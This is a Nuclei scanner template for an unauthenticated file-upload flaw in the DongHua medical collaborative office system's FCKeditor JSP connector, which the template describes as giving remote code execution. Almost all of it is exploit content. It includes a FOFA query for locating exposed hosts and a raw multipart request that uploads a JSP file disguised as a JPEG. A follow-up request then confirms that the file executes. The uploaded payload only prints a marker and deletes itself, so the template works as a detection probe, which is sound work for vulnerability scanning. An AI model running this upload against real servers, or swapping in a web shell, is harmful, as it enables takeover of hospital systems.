id: donghua-medical-oa-file-upload

info:
  name: 东华医疗协同办公系统 connector接口文件上传漏洞
  author: 0dayPoc
  severity: high
  description: |-
    fofa: body="/skin/charmBlue/css/dialog.css"
        东华医疗协同办公系统在connector接口实现中存在文件上传权限校验缺陷，攻击者可利用此漏洞在目标服务器上执行任意代码，通过上传恶意文件建立持久化控制通道，最终达成对Web服务器的完全控制。该漏洞允许在未授权情况下绕过文件类型过滤机制，实现远程代码执行。
  tags: 东华医疗协同办公系统

flow: |
  http(1) && http(2)

http:
- raw:
  - |
    POST /common/FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=FileUpload&Type=&CurrentFolder=/ HTTP/1.1
    Host: {{Hostname}}
    Cookie: JSESSIONID=17A17E4D9E4E38B72D650895AFF7D1DF
    Cache-Control: max-age=0
    Upgrade-Insecure-Requests: 1
    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryt1qdEWTI01cj5BLV
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
    Connection: close

    ------WebKitFormBoundaryt1qdEWTI01cj5BLV
    Content-Disposition: form-data; name="NewFile"; filename="NTest.jsp"
    Content-Type: image/jpeg

    <% out.println("NdayTest"); new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
    ------WebKitFormBoundaryt1qdEWTI01cj5BLV
    Content-Disposition: form-data; name="Submit"

    upload
    ------WebKitFormBoundaryt1qdEWTI01cj5BLV--
- raw:
  - |
    GET /FCKeditor/UserFiles/NTest.jsp HTTP/1.1
    Host: {{Hostname}}
  matchers-condition: and
  matchers:
  - type: status
    status: [200]
  - type: word
    part: body
    words:
    - 'NdayTest'
